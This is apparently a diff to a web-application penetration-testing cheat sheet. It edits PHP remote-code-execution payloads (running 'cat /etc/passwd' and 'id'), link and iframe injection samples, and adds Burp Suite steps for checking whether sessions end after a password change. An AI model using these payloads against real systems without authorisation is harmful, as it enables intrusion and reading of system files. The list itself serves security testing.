@@ -22,7 +22,7 @@
 ## Remote Code Execution (RCE):
 ```
 <?php system("cat /etc/passwd");?>
-<?php system("cat /etc/passwd");?>
+<?php system("id");?>
 <?php echo phpinfo(); ?>
 <?php include 'C:\Windows\System32\drivers\etc\hosts';?>
 ```
@@ -76,11 +76,11 @@ javascript:alert(1)//
 ```
 ## Link Injection:
 ```
-<a href="https://www.intelliroot.com">Test</a>
+<a href="https://www.intelliroot.com">ClickMe</a>
 ```
 ## Iframe Injection:
 ```
-<iframe src="https://https://www.intelliroot.com"></iframe>
+<iframe src="https://www.intelliroot.com"></iframe>
 ```
 ## Blind Cross Site Scripting Attack:
 ```
@@ -110,7 +110,13 @@ Step3: Now open into the browser and click submit.
 ### Test CGI script exposes environment variables
 ### Account Takeover through forget password
 ### Improper File Content Validation in the Application
-### No Session Termination After Password Change
+### No Session Termination After Password Change:
+```
+Step1: Login as a user, After logged in capture a request of any functionality and get into the Repeater and send to Response.
+Step2: Wait minimum 40,50 minutes, Do not loggout the account.
+Step3: After complete the time, then again click send to the reponse in the Burpsuite.
+Step4: If its working properly, then it No Session Termination Vulnerability.
+```
 ### Password History Check is not Implemented
 ### Concurrent Logins with the Same Username in admin/user account
 ### Trace method Enabled
